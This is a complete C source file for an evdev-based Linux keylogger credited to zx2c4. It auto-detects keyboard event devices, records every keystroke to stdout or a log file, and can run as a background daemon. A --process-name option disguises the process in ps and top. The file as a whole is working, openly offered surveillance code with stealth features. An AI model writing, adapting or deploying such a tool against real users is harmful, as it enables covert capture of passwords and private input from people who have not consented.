/*
 * logger.c
 *
 * Copyright 2012 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
 *
 * Logs keys with evdev.
 *
 *
 * TODO:
 *   - Get delay time between key key repeat from X server.
 *
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <getopt.h>
#include <sys/types.h>
#include <sys/select.h>

#include "keymap.h"
#include "process.h"

#define MAX_PATH 256
#define MAX_EVDEV 16

int find_default_keyboard_list(char event_device[MAX_EVDEV][MAX_PATH])
{
    FILE *devices;
    char events[128];
    char handlers[128];
    char *event;
    int evnum = 0, i;

    devices = fopen("/proc/bus/input/devices", "r");
    if (!devices) {
        perror("fopen");
        return evnum;
    }
    while (fgets(events, sizeof(events), devices))
    {
        if (strstr(events, "H: Handlers=") == events)
            strcpy(handlers, events);
        else if (!strcmp(events, "B: EV=120013\n") && (event = strstr(handlers, "event")))
        {
            for (i = 0, event += sizeof("event") - 1; *event && isdigit(*event); ++event, ++i)
                handlers[i] = *event;
            handlers[i] = '\0';

            snprintf(event_device[evnum], sizeof(event_device[evnum]),
                     "/dev/input/event%s", handlers);

            fprintf(stderr, "listening to keyboard: %s\n", event_device[evnum]);

            if (++evnum == MAX_EVDEV) break;
        }
    }
    fclose(devices);
    return evnum;
}

int main(int argc, char *argv[])
{
    char buffer[MAX_PATH];
    char event_device[MAX_EVDEV][MAX_PATH];
    char *log_file, *pid_file, *process_name, option;
    int evdev_fd[MAX_EVDEV];
    int i, daemonize, force_us_keymap, option_index;
    FILE *log, *pid;
    struct input_event ev;
    struct input_event_state state;

    static struct option long_options[] = {
        {"daemonize", no_argument, NULL, 'd'},
        {"foreground", no_argument, NULL, 'f'},
        {"force-us-keymap", no_argument, NULL, 'u'},
        {"event-device", required_argument, NULL, 'e'},
        {"log-file", required_argument, NULL, 'l'},
        {"pid-file", required_argument, NULL, 'p'},
        {"process-name", required_argument, NULL, 'n'},
        {"help", no_argument, NULL, 'h'},
        {0, 0, 0, 0}
    };

    memset(event_device, 0, sizeof(event_device));
    strcpy(event_device[0], "auto");
    log_file = 0;
    log = stdout;
    pid_file = 0;
    process_name = 0;
    daemonize = 0;
    force_us_keymap = 0;

    close(STDIN_FILENO);

    while ((option = getopt_long(argc, argv, "dfue:l:p:n:h", long_options, &option_index)) != -1) {
        switch (option) {
        case 'd':
            daemonize = 1;
            break;
        case 'f':
            daemonize = 0;
            break;
        case 'u':
            force_us_keymap = 1;
            break;
        case 'e':
            strncpy(event_device[0], optarg, sizeof(event_device[0]));
            break;
        case 'l':
            log_file = optarg;
            break;
        case 'p':
            pid_file = optarg;
            break;
        case 'n':
            process_name = optarg;
            break;
        case 'h':
        case '?':
        default:
            fprintf(stderr, "Evdev Keylogger by zx2c4\n\n");
            fprintf(stderr, "Usage: %s [OPTION]...\n", argv[0]);
            fprintf(stderr, "  -d, --daemonize                     run as a background daemon\n");
            fprintf(stderr, "  -f, --foreground                    run in the foreground (default)\n");
            fprintf(stderr, "  -u, --force-us-keymap               instead of auto-detection, force usage of built-in US keymap\n");
            fprintf(stderr, "  -e DEVICE, --event-device=DEVICE    use event device DEVICE (default=auto-detect)\n");
            fprintf(stderr, "  -l FILE, --log-file=FILE            write key log to FILE (default=stdout)\n");
            fprintf(stderr, "  -p FILE, --pid-file=FILE            write the pid of the process to FILE\n");
            fprintf(stderr, "  -n NAME, --process-name=NAME        change process name in ps and top to NAME\n");
            fprintf(stderr, "  -h, --help                          display this message\n");
            return option == 'h' ? EXIT_SUCCESS : EXIT_FAILURE;
        }
    }

    if (!strcmp(event_device[0], "auto")) {
        if (find_default_keyboard_list(event_device) == 0) {
            fprintf(stderr,
                    "Could not find default event device.\n"
                    "Try passing it manually with --event-device.\n");
            return EXIT_FAILURE;
        }
    }
    if (log_file && strlen(log_file) != 1 && log_file[0] != '-' && log_file[1] != '\0') {
        if (!(log = fopen(log_file, "w"))) {
            perror("fopen");
            return EXIT_FAILURE;
        }
        close(STDOUT_FILENO);
    }

    for (i = 0; i < MAX_EVDEV; ++i)
        evdev_fd[i] = -1;

    for (i = 0; i < MAX_EVDEV; ++i)
    {
        if (!event_device[i][0]) break;

        if ((evdev_fd[i] = open(event_device[i], O_RDONLY | O_NOCTTY)) < 0) {
            perror("open");
            fprintf(stderr, "Perhaps try running this program as root.\n");
            return EXIT_FAILURE;
        }
    }

    if (!force_us_keymap) {
        if (load_system_keymap())
            fprintf(stderr, "Failed to load system keymap. Falling back onto built-in US keymap.\n");
    }
    if (pid_file) {
        pid = fopen(pid_file, "w");
        if (!pid) {
            perror("fopen");
            return EXIT_FAILURE;
        }
    }
    if (daemonize) {
        if (daemon(0, 1) < 0) {
            perror("daemon");
            return EXIT_FAILURE;
        }
    }
    if (pid_file) {
        if (fprintf(pid, "%d\n", getpid()) < 0) {
            perror("fprintf");
            return EXIT_FAILURE;
        }
        fclose(pid);
    }

    /* DO NOT REMOVE ME! */
    drop_privileges();

    if (process_name)
        set_process_name(process_name, argc, argv);

    while (1)
    {
        fd_set rfds;
        int max_fd = 0, retval;

        FD_ZERO(&rfds);

        for (i = 0; i < MAX_EVDEV; ++i) {
            if (evdev_fd[i] == -1) continue;

            FD_SET(evdev_fd[i], &rfds);
            if (max_fd < evdev_fd[i]+1)
                max_fd = evdev_fd[i]+1;
        }

        if (max_fd == 0) break;

        retval = select(max_fd, &rfds, NULL, NULL, NULL);

        if (retval == -1) {
            perror("select()");
            break;
        }

        for (i = 0; i < MAX_EVDEV; ++i) {
            if (evdev_fd[i] == -1) continue;
            if (!FD_ISSET(evdev_fd[i], &rfds)) continue;

            memset(&state, 0, sizeof(state));
            ssize_t rb;

            while ( (rb = read(evdev_fd[i], &ev, sizeof(ev))) > 0 )
            {
                if (translate_event(&ev, &state, buffer, sizeof(buffer)) > 0) {
                    fprintf(log, "%s", buffer);
                    fflush(log);
                }
            }

            if (rb < 0) {
                perror("read()");
                evdev_fd[i] = -1;
                break;
            }
        }
    }

    fclose(log);

    for (i = 0; i < MAX_EVDEV; ++i)
    {
        if (evdev_fd[i] != -1)
            close(evdev_fd[i]);
    }

    return EXIT_FAILURE;
}
